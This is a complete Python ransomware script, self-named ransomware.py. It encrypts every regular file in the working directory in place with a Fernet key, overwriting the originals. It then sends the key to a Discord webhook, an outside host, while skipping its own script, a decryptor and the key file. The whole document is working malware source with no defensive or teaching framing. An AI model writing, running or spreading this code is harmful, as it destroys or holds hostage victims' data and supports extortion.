import os
import requests
from cryptography.fernet import Fernet

my_files = []
key = Fernet.generate_key()
webhook_url = "YOUR_DISCORD_WEBHOOK"

def send_key_to_discord():
    global webhook_url
    global key
    if key:
        payload = {
            "content": key
        }
        try:
            requests.post(webhook_url, json=payload)
        except Exception as e:
            print("Sending error:", e)

for file in os.listdir():
	if file == "ransomware.py" or file == "ransomdecrypt.py" or file == "generatedkey.key" or not os.path.isfile(file):
		continue
	else:
		my_files.append(file)

with open("generatedkey.key","wb") as generatedkey:
	generatedkey.write(key)

for file in my_files:
	with open(file,"rb") as the_file:
		content = the_file.read()
	content_encrypted = Fernet(key).encrypt(content)
	with open(file,"wb") as the_file:
		the_file.write(content_encrypted)



send_key_to_discord()
